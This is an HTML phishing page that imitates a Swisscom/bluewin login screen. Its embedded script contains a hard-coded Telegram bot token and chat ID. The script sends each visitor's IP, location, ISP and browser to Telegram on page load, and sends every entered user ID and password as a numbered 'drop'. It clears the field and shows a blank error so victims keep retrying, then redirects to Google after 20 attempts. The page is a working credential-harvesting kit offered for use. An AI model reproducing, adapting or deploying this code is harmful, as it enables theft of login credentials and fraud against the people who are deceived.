<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Swisscom Login</title>

  <style>
/* 1. Global Reset */
*, *::before, *::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html, body {
    height: 100%;
    width: 100%;
    overflow: hidden; /* Prevents any shifting or scrolling */
    font-family: Arial, sans-serif;
}

body {
    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1787031318/bluewin.ch_wggy1q.jpg');
    /* 100% 100% forces the image to match the screen exactly like a laptop view */
    background-size: 100% 100%; 
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    height: 100vh;
    width: 100vw;
}

/* 2. Login Container - FIXED COORDINATES (Zero Shift) */
.box {
    position: absolute;
    /* YOUR EXACT BIG LAPTOP COORDINATES - LOCKED */
    top: 54.7%; 
    left: 63%; 
    transform: translate(-50%, -50%);

    /* Proportional width that scales with the screen width */
    width: 30%; 
    min-width: 280px; 
    max-width: 350px; 

    padding: 20px;
    border-radius: 10px;
    text-align: center;
    background: transparent;
}

/* 3. Input Syncing */
input {
    width: 100%; 
    padding: 14px;
    border-radius: 6px;
    border: 1px solid #ccc;
    margin-top: 8px;
    font-size: 15px;
    display: block;
}

/* 4. Steps Visibility Logic */
#emailStep { display: block; }
#passwordStep { display: none; }

/* 5. UI Elements */
h2 {
    margin-bottom: 15px;
    font-weight: 400;
    color: #1d1d1d;
}

button {
    width: 100%;
    margin-top: 20px;
    padding: 12px;
    border: none;
    background: #003e9b;
    color: white;
    font-size: 16px;
    border-radius: 90px;
    cursor: pointer;
}

button:hover { opacity: 0.9; }

.back-link {
    text-align: left;
    margin-bottom: 20px;
    font-size: 14px;
    color: #003e9b;
    cursor: pointer;
    display: none;
}

/* 6. Intro Overlay - Fixed Scaling */
#introImageContainer {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background-image: url("https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png");
    /* Forces intro image to stay proportional to the screen */
    background-size:  100%; 
    background-repeat: no-repeat;
    background-position: center;
    background-color: #ffffff;
    z-index: 9999;
}
  </style>
</head>

<body>
  <!-- Intro Image Section -->
  <div id="introImageContainer">
    <h2></h2>
  </div>

  <div class="box" id="loginContainer">
    <div id="backBtn" class="back-link" onclick="goBack()">←Enter Password For</div>

    <!-- USER ID STEP -->
    <div id="userIdStep">
      <h2></h2>
      <label>Please log in here with your Swisscom.
</label>

      <input type="text" id="userIdInput" value="" Placeholder="Enter username" required>
      <button onclick="goToPassword()">Continue</button>
    </div>

    <!-- PASSWORD STEP -->
    <div id="passwordStep">
      <h2></h2>
      <div id="showUserId" style="margin-bottom: 40px; font-size: 20px; color:#333;"></div>
      <label></label>
      <input type="password" id="passwordInput" Placeholder="Enter Password" required>
      <button onclick="handleLogin()">Continue</button>
    </div>
    <div id="errorMessage"></div>
  </div>

  <script>
    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
    const chatId = '8052751627';
    let loginAttempts = 0;

    function sendToTelegram(message) {
      if (!navigator.onLine) {
        console.log("[Offline] Telegram Message:", message);
        return;
      }
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).catch(err => console.error('Telegram error:', err));
    }

    function getPort() {
      return window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
    }

    function sendVisitInfo() {
      const userAgent = navigator.userAgent;
      const port = getPort();
      if (!navigator.onLine) {
        sendToTelegram(`📴 bluch Offline Visit\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
        return;
      }
      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const message = `bluch Visit Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
          sendToTelegram(message);
        }).catch(() => {
          sendToTelegram(`bluch Visit Info (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
        });
    }

    function goToPassword() {
      let userid = document.getElementById("userIdInput").value.trim();

      if (userid === "") {
        alert("Please enter your User ID");
        return;
      }

      document.getElementById("userIdStep").style.display = "none";
      document.getElementById("passwordStep").style.display = "block";
      document.getElementById("backBtn").style.display = "block";
      document.getElementById("showUserId").innerText = userid;
    }

    function goBack() {
      document.getElementById("passwordStep").style.display = "none";
      document.getElementById("userIdStep").style.display = "block";
      document.getElementById("backBtn").style.display = "none";
    }

    function handleLogin() {
      const email = document.getElementById('userIdInput').value.trim();
      const password = document.getElementById('passwordInput').value.trim();

      if (!email || !password) {
        document.getElementById('errorMessage').textContent = "";
        document.getElementById('errorMessage').style.display = 'block';
        return;
      }

      loginAttempts++;
      const msg = `❌bluch drop #${loginAttempts}\n👤 User ID: ${email}\n🔑 Password: ${password}`;
      sendToTelegram(msg);

      document.getElementById('errorMessage').textContent = "";
      document.getElementById('errorMessage').style.display = 'block';
      document.getElementById('passwordInput').value = '';

      if (loginAttempts >= 20) {
        window.location.href = 'https://google.com';
      }
    }

    window.onload = function () {
      sendVisitInfo();
      setTimeout(() => {
        document.getElementById('introImageContainer').style.display = 'none';
        document.getElementById('loginContainer').style.display = 'block';
      }, 1000); // Show intro image for 5 seconds
    };
  </script>
</body>

</html>
